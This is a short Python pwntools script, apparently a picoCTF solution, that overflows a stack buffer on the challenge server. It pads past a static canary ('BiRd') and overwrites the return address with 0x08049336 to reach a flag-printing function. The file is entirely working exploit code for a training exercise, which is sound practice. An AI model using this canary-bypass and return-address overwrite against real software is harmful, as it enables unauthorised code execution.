from pwn import *

length = 64+4+16+4 # = 88 
payload = 'A'*64
canary = 'BiRd'
payload+=canary
payload+='A'*16
payload+='\x36\x93\x04\x08'
address_display_flag = 0x8049336 # or 0x8049336

p = remote('saturn.picoctf.net', 63915)
p.sendlineafter('> ', str(length)) # Size of payload
p.sendlineafter('> ', payload)
out = p.recvall()
print(out)
if "pico" in str(out):
    print(out)
p.close()
